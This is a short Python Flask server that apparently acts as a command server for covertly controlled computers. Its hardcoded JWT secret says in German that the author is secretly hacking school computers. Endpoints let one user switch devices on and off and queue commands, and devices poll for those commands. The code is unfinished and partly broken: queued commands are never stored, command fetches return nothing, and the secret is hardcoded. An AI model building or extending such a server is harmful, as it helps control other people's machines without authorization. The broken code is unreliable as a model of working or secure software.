from flask import Flask, make_response, request
import management
import jwt

SECRET = "iCH hAcKe scHuLcomPuTer, aBer das DaRf niemAnd wIsSen!1!"
DEVICES_STORAGE_LOCATION = "devices.txt"

devices = management.DeviceStorage.load_devices(DEVICES_STORAGE_LOCATION)

app = Flask(__name__)


@app.get("/active")
def active():
    return make_response(devices.active())

@app.post("/active/<device_hostname>")
def activate(device_hostname):
    token = request.headers.get("token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            devices[device_hostname].active = True

@app.post("/inactive/<device_hostname>")
def inactivate(device_hostname):
    token = request.headers.get("token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            devices[device_hostname].active = False


@app.post("/commands/add/<device_hostname>")
def add_command(device_hostname):
    token = request.headers.get("token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            request.get_data()

@app.get("/commands/get")
def get_command():
    token = request.headers.get("token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        device_hostname = payload["sub"]
        management.get_device(device_hostname).get()
